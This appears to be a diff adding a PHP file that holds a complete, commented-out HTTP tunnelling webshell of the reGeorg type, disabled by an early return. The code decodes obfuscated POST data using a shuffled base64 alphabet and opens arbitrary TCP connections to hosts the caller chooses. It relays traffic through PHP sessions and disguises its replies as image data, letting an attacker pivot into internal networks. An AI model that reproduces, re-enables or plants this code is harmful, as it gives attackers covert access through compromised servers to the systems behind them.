@@ -1,0 +1,215 @@
+<?php
+
+return;
+// ini_set("allow_url_fopen", true);
+// ini_set("allow_url_include", true);
+// ini_set('always_populate_raw_post_data', -1);
+// error_reporting(E_ERROR | E_PARSE);
+
+// if(version_compare(PHP_VERSION,'5.4.0','>='))@http_response_code(200);
+
+// function blv_decode($data) {
+//     $data_len = strlen($data);
+//     $info = array();
+//     $i = 0;
+//     while ( $i < $data_len) {
+//         $d = unpack("c1b/N1l", substr($data, $i, 5));
+//         $b = $d['b'];
+//         $l = $d['l'] - 7126472;
+//         $i += 5;
+//         $v = substr($data, $i, $l);
+//         $i += $l;
+//         $info[$b] = $v;
+//     }
+//     return $info;
+// }
+
+// function blv_encode($info) {
+//     $data = "";
+//     $info[0] = randstr();
+//     $info[39] = randstr();
+
+//     foreach($info as $b => $v) {
+//         $l = strlen($v) + 7126472;
+//         $data .= pack("c1N1", $b, $l);
+//         $data .= $v;
+//     }
+//     return $data;
+// }
+
+// function randstr() {
+//     $rand = '';
+//     $length = mt_rand(5, 20);
+//     for ($i = 0; $i < $length; $i++) {
+//         $rand .= chr(mt_rand(0, 255));
+//     }
+//     return $rand;
+// }
+
+// $en = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
+// $de = "G1lSy/+fOjeIJ6vQDURCKcHr8x5ZsnztbqFAM3ahBNpTP49WmwXoVgELd0kY7iu2";
+
+// function Prefer($text,$a,$b) {return strtr($text,$a,$b);}
+
+// function Line($text,$a,$b) {return strtr($text,$b,$a);}
+
+// $post_data = file_get_contents("php://input");
+// if (1 == 1) {
+//     $post_data = substr($post_data, 28);
+//     $post_data = substr($post_data, 0, -8);
+// }
+// $info = blv_decode(base64_decode(Line($post_data,$en,$de)));
+// $rinfo = array();
+
+// $mark = $info[3];
+// $cmd = $info[2];
+// $run = "run".$mark;
+// $writebuf = "writebuf".$mark;
+// $readbuf = "readbuf".$mark;
+
+// switch($cmd){
+//     case "CONNECT":
+//         {
+//             set_time_limit(0);
+//             $target = $info[6];
+//             $port = (int) $info[7];
+//             $res = @stream_socket_client("$info[6]:$info[7]", $errno, $errstr, 3);
+//             if ($res === false)
+//             {
+//                 $rinfo[4] = 'FAIL';
+//                 $rinfo[5] = 'Failed connecting to target';
+//                 break;
+//             }
+
+//             stream_set_blocking($res, false);
+//             ignore_user_abort();
+
+//             @session_start();
+//             $_SESSION[$run] = true;
+//             $_SESSION[$writebuf] = "";
+//             $_SESSION[$readbuf] = "";
+//             $_SESSION[$run."DEL"] = false;
+//             session_write_close();
+
+//             while ($_SESSION[$run])
+//             {
+//                 if (empty($_SESSION[$writebuf])) {
+//                     usleep(50000);
+//                 }
+
+//                 $readBuff = "";
+//                 @session_start();
+//                 $writeBuff = $_SESSION[$writebuf];
+//                 $_SESSION[$writebuf] = "";
+//                 session_write_close();
+//                 if ($writeBuff != "")
+//                 {
+//                     stream_set_blocking($res, false);
+//                     $i = fwrite($res, $writeBuff);
+//                     if($i === false)
+//                     {
+//                         @session_start();
+//                         $_SESSION[$run] = false;
+//                         session_write_close();
+//                         return;
+//                     }
+//                 }
+//                 stream_set_blocking($res, false);
+//                 while ($o = fgets($res, 513)) {
+//                     if($o === false)
+//                     {
+//                         @session_start();
+//                         $_SESSION[$run] = false;
+//                         session_write_close();
+//                         return;
+//                     }
+//                     $readBuff .= $o;
+//                     if ( strlen($readBuff) > 524288 ) {
+//                         break;
+//                     }
+//                 }
+//                 if ($readBuff != ""){
+//                     @session_start();
+//                     $_SESSION[$readbuf] .= $readBuff;
+//                     session_write_close();
+//                 }
+//                 if ($readBuff === ""){
+//                     if (feof($res)) {
+//                         @session_start();
+//                         $_SESSION[$run] = true;
+//                         $_SESSION[$run."DEL"] = true;
+//                         session_write_close();
+//                         return;
+//                     }
+//                 }
+
+//             }
+//             fclose($res);
+//         }
+//         @header_remove('set-cookie');
+//         break;
+//     case "DISCONNECT":
+//         {
+//             @session_start();
+//             unset($_SESSION[$run]);
+//             unset($_SESSION[$readbuf]);
+//             unset($_SESSION[$writebuf]);
+//             session_write_close();
+//         }
+//         break;
+//     case "READ":
+//         {
+//             @session_start();
+//             $readBuffer = $_SESSION[$readbuf];
+//             $_SESSION[$readbuf]="";
+//             $running = $_SESSION[$run];
+//             $delsession = $_SESSION[$run."DEL"];
+//             session_write_close();
+//             if ($running) {
+//                 $rinfo[4] = 'OK';
+//                 $rinfo[1] = $readBuffer;
+//                 header("Connection: Keep-Alive");
+//                 if ($delsession){
+//                     @session_start();
+//                     $_SESSION[$run] = false;
+//                     session_write_close();
+//                 }
+//             } else {
+//                 $rinfo[4] = 'FAIL';
+//                 $rinfo[5] = 'Connetct is closed';
+//             }
+//         }
+//         break;
+//     case "FORWARD": {
+//             @session_start();
+//             $running = $_SESSION[$run];
+//             session_write_close();
+//             if(!$running){
+//                 $rinfo[4] = 'FAIL';
+//                 $rinfo[5] = 'Connetct is closed';
+//                 break;
+//             }
+//             $rawPostData = $info[1];
+//             if ($rawPostData) {
+//                 @session_start();
+//                 $_SESSION[$writebuf] .= $rawPostData;
+//                 session_write_close();
+//                 $rinfo[4] = 'OK';
+//                 header("Connection: Keep-Alive");
+//             } else {
+//                 $rinfo[4] = 'FAIL';
+//                 $rinfo[5] = 'POST data parse error';
+//             }
+//         }
+//         break;
+//     default: {
+//         $sayhello = true;
+//         @session_start();
+//         session_write_close();
+//     }
+// }
+// if ( $sayhello ) {
+//     echo "";
+// } else {
+//     echo "image/bmp;base32,", Prefer(base64_encode(blv_encode($rinfo)),$en,$de);
+// }
